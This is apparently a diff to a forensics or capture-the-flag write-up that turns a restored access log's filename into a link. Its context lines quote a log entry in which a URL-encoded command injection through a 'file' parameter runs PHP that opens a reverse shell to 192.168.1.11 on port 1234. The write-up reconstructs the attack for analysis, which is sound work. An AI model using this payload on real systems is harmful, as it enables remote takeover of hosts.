@@ -163,7 +163,7 @@ using strings in combination with grep we get the log files:
 **Relevant log line**  
 `192.168.1.11 - - [22/Nov/2016:09:48:56 +0100] "GET /originalIndex.php?password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&file=;php%20-r%20%27%24sock%3dfsockopen(%22192.168.1.11%22%2c1234)%3bexec(%22%2fbin%2fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3b%27 HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"`
 
-the file "restored-access.log" contains the full restore of the access.log.
+the file [restored-access.log](assets/restored-access.log) contains the full restore of the access.log.
 
 this line compromises the host using php.
 **decoded line**  
